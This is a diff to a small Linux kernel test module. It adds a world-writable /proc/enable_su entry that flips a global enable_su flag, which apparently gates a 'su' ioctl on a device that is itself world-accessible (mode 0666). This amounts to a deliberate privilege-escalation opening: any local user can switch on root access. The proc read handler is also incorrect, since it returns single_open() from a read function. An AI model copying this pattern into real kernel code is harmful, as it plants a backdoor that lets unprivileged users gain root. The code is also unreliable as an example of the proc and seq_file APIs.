@@ -9,6 +9,9 @@
 #include <linux/slab.h>
 #include <linux/inet.h>
 #include <net/udp.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+#include <linux/mutex.h>
 
 struct test_ip_ioctl_request {
 	uint16_t port;
@@ -18,6 +21,8 @@ struct test_ip_ioctl_request {
 #define TEST_SU_IOCTL _IO(150, 1)
 #define TEST_IP_IOCTL _IOR(150, 2, struct test_ip_ioctl_request)
 
+DEFINE_MUTEX(mtx);
+int enable_su = 0;
 
 static struct socket *sock = NULL;
 
@@ -169,6 +174,26 @@ long hello_ioctl(struct file *fp, unsigned int cmd, unsigned long arg) {
   return -ENOTTY;
 }
 
+static int hello_show(struct seq_file *m, void *v) {
+	seq_printf(m, "%d", enable_su);
+	return 0;
+}
+
+static ssize_t hello_proc_read(struct file * file, char * buf, size_t count, loff_t *ppos) {
+	return single_open(file, hello_show, NULL);
+}
+
+static ssize_t hello_proc_write(struct file * file, const char * buf, size_t count, loff_t *ppos) {
+	char b;
+	if(copy_from_user(&b, buf, 1)) {
+		return -EFAULT;
+	}
+
+	enable_su = b == '1';
+	printk("su is now: %d\n", enable_su);
+	return count;
+}
+
 static const struct file_operations hello_fops = {
   .owner		= THIS_MODULE,
   .read		= hello_read,
@@ -183,7 +208,15 @@ static struct miscdevice hello_dev = {
   .mode = 0666,
 };
 
-  static int __init
+
+
+static const struct file_operations hello_proc_fops = {
+	.owner = THIS_MODULE,
+	.read = hello_proc_read,
+	.write = hello_proc_write,
+};
+
+static int __init
 hello_init(void)
 {
   int ret;
@@ -194,6 +227,7 @@ hello_init(void)
     return 1;
   }
 
+	proc_create("enable_su", 0666, NULL, &hello_proc_fops);
   change_ip("192.168.1.2");
 
   return ret;
@@ -205,6 +239,7 @@ module_init(hello_init);
 hello_exit(void)
 {
   misc_deregister(&hello_dev);
+	remove_proc_entry("enable_su", NULL);
 }
 
 module_exit(hello_exit);
